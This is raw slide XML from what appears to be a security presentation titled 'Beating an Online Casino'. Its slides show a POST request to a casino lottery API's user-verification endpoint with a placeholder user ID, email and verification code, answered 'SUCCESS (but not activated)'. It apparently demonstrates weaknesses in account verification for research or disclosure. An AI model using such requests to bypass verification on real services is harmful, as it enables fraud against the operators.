              <a:t>  "email": "john.doe@gmail.com",</a:t>
            </a:r>
            <a:endParaRPr sz="1900">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en" sz="1900">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>  "verification_code": "ABC123XYZ"</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="1900">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1900">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>}</a:t>
            </a:r>
            <a:endParaRPr sz="1900">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="1900">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="626" name="Google Shape;626;p77"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8545425" y="4532900"/>
            <a:ext cx="451200" cy="466200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="dk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7" name="Google Shape;627;p77"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="12" type="sldNum"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8352133" y="4569192"/>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solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="628" name="Google Shape;628;p77"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="845225" y="266850"/>
            <a:ext cx="7098900" cy="1262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3500">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Russo One"/>
                <a:ea typeface="Russo One"/>
                <a:cs typeface="Russo One"/>
                <a:sym typeface="Russo One"/>
              </a:rPr>
              <a:t>Beating an Online Casino</a:t>
            </a:r>
            <a:endParaRPr sz="3500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Russo One"/>
              <a:ea typeface="Russo One"/>
              <a:cs typeface="Russo One"/>
              <a:sym typeface="Russo One"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="3500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Russo One"/>
              <a:ea typeface="Russo One"/>
              <a:cs typeface="Russo One"/>
              <a:sym typeface="Russo One"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="629" name="Google Shape;629;p77"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="0"/>
            <a:ext cx="548700" cy="1518900"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="CC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sld>
</file>

<file path=ppt/slides/slide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3F3F3"/>
        </a:solidFill>
      </p:bgPr>
    </p:bg>
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="633" name="Shape 633"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="634" name="Google Shape;634;p78"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="472125" y="1597150"/>
            <a:ext cx="8671800" cy="3504000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="t" bIns="91425" lIns="91425" spcFirstLastPara="1" rIns="91425" wrap="square" tIns="91425">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="-349250" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1900"/>
              <a:buFont typeface="Courier New"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1900">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>POST </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1900">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>lottery-api.casinosite.com/api/v1/users/verify</a:t>
            </a:r>
            <a:endParaRPr sz="1900">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="1900">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1900">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>{</a:t>
            </a:r>
            <a:endParaRPr sz="1900">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1900">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>  "userid": "123456789",</a:t>
            </a:r>
            <a:endParaRPr sz="1900">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1900">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>  "email": "john.doe@gmail.com",</a:t>
            </a:r>
            <a:endParaRPr sz="1900">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en" sz="1900">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>  "verification_code": "ABC123XYZ"</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="1900">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1900">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>}</a:t>
            </a:r>
            <a:endParaRPr sz="1900">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="1900">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1900">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>SUCCESS (but not activated)</a:t>
            </a:r>
            <a:endParaRPr sz="1900">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="1900">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="635" name="Google Shape;635;p78"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8545425" y="4532900"/>
            <a:ext cx="451200" cy="466200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="dk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6" name="Google Shape;636;p78"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="12" type="sldNum"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8352133" y="4569192"/>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solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="637" name="Google Shape;637;p78"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="845225" y="266850"/>
            <a:ext cx="7098900" cy="1262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3500">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Russo One"/>
                <a:ea typeface="Russo One"/>
                <a:cs typeface="Russo One"/>
                <a:sym typeface="Russo One"/>
              </a:rPr>
              <a:t>Beating an Online Casino</a:t>
            </a:r>
            <a:endParaRPr sz="3500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Russo One"/>
              <a:ea typeface="Russo One"/>
              <a:cs typeface="Russo One"/>
              <a:sym typeface="Russo One"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="3500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Russo One"/>
              <a:ea typeface="Russo One"/>
              <a:cs typeface="Russo One"/>
              <a:sym typeface="Russo One"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="638" name="Google Shape;638;p78"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="0"/>
            <a:ext cx="548700" cy="1518900"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="CC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sld>
</file>

<file path=ppt/slides/slide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3F3F3"/>
        </a:solidFill>
      </p:bgPr>
    </p:bg>
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="642" name="Shape 642"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="643" name="Google Shape;643;p79"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="472125" y="1597150"/>
            <a:ext cx="8671800" cy="3167700"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="t" bIns="91425" lIns="91425" spcFirstLastPara="1" rIns="91425" wrap="square" tIns="91425">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="-349250" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1900"/>
              <a:buFont typeface="Courier New"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1900">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>POST lottery-api.casinosite.com/api/v1/users/verify</a:t>
            </a:r>
            <a:endParaRPr sz="1900">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="1900">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1900">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>{</a:t>
            </a:r>
            <a:endParaRPr sz="1900">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1900">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>  "userid": "123456789",</a:t>
            </a:r>
            <a:endParaRPr sz="1900">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en" sz="1900">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>  "verification_code": "ABC123XYZ"</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="1900">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1900">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>}</a:t>
            </a:r>
            <a:endParaRPr sz="1900">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="1900">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1900">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>SUCCESS (but not activated)</a:t>
            </a:r>
            <a:endParaRPr sz="1900">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="1900">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="644" name="Google Shape;644;p79"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8545425" y="4532900"/>
            <a:ext cx="451200" cy="466200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="dk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5" name="Google Shape;645;p79"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="12" type="sldNum"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8352133" y="4569192"/>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solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
